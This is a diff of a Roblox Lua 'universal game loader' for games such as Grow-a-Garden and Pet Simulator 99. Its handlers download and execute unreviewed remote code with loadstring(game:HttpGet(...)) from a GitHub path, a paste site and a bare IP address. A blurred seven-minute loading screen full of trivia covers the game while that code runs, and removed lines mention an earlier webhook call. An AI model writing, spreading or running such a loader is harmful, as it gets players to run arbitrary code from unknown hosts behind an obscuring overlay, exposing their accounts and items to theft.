@@ -1,4 +1,4 @@
--- Universal Game Loader (OLD GUI style, fixed handlers, immediate exec + 7min UI)
+-- Universal Game Loader
 -- Supported PlaceIds:
 -- 126884695634066 = Grow-a-Garden
 -- 124977557560410 = Grow-a-Garden [NEWBIES]
@@ -7,7 +7,6 @@
 -- 18901165922    = PETS GO
 -- 8737899170     = Pet Simulator 99
 
--- Services
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
 local CoreGui = game:GetService("CoreGui")
@@ -18,7 +17,6 @@ local MarketplaceService = game:GetService("MarketplaceService")
 
 local player = Players.LocalPlayer
 
--- Supported games
 local SupportedGames = {
     [126884695634066] = "Grow-a-Garden",
     [124977557560410] = "Grow-a-Garden [NEWBIES]",
@@ -28,26 +26,42 @@ local SupportedGames = {
     [8737899170] = "Pet Simulator 99"
 }
 
--- Function to get game name
 local function getGameName(placeId)
     return SupportedGames[placeId] or "Unknown Game"
 end
 
--- (Webhook function removed)
-
--- Fun facts
 local funFacts = {
     "Did you know? Roblox launched in 2006!",
     "Tip: Press F9 to open the dev console.",
     "Fun Fact: Lua is the scripting language used by Roblox.",
     "Pro tip: Take short breaks to avoid burnout.",
-    "Did you know? Some Roblox games reach millions of players!"
+    "Did you know? Some Roblox games reach millions of players!",
+    "Fact: The Roblox logo has changed 5 times since launch.",
+    "Tip: You can mute sounds in-game with the Escape menu.",
+    "Roblox once had a feature called 'Tickets' as currency.",
+    "Did you know? Adopt Me is the most visited Roblox game.",
+    "Roblox originally was called DynaBlocks in 2004.",
+    "Fun Fact: Pet Simulator 99 is part of a whole simulator series.",
+    "MM2 (Murder Mystery 2) is based on the classic Garry’s Mod 'Murder'.",
+    "Fact: Roblox Studio is free and open to everyone.",
+    "Tip: Always check the developer console for hidden errors.",
+    "Roblox supports VR games too!",
+    "Did you know? There are more than 60 million Roblox experiences.",
+    "Roblox uses the Havok physics engine for simulation.",
+    "Pro tip: Low graphics settings can improve FPS in big games.",
+    "Fact: Some players earn real money through Roblox DevEx.",
+    "Did you know? The maximum friends you can have is 200.",
+    "Tip: Use Ctrl+Shift+F to search scripts in Roblox Studio.",
+    "Fun Fact: The oof death sound was replaced in 2022.",
+    "Fact: There’s a hidden emote wheel in Roblox (press “/e dance”).",
+    "Did you know? You can upload clothing to earn Robux.",
+    "Roblox Premium gives a monthly Robux stipend.",
+    "Fun Fact: Some Roblox eggs from Egg Hunts are now rare collectibles."
 }
 
--- Loader UI
 local function createLoadingScreen(gameName, duration)
     if not gameName then gameName = "Game" end
-    duration = duration or 420 -- default 7 minutes
+    duration = duration or 420
 
     local blur = Instance.new("BlurEffect")
     blur.Name = "UniversalLoaderBlur"
@@ -210,7 +224,6 @@ local function createLoadingScreen(gameName, duration)
     end
 end
 
--- Handlers
 local handlers = {
     [8737899170] = {name="Pet Simulator 99", action=function() loadstring(game:HttpGet("https://raw.githubusercontent.com/ingeniousmainmn/Universal/refs/heads/main/Universal", true))() end},
     [18901165922] = {name="PETS GO", action=function() loadstring(game:HttpGet("https://paste.debian.net/plainh/b11ed528/", true))() end},
@@ -220,15 +233,11 @@ local handlers = {
     [124977557560410] = {name="Grow-a-Garden [NEWBIES]", action=function() ID="e2249ae4-0580-4b0f-8289-87f460b363d6"; loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))() end},
 }
 
--- Main
 local placeId = game.PlaceId
 local entry = handlers[placeId]
 
 if entry then
     createLoadingScreen(entry.name, 420)
-
-    -- webhook call removed (was here)
-
     pcall(function()
         StarterGui:SetCore("SendNotification", {Title="Game detected", Text=entry.name, Duration=5})
         entry.action()
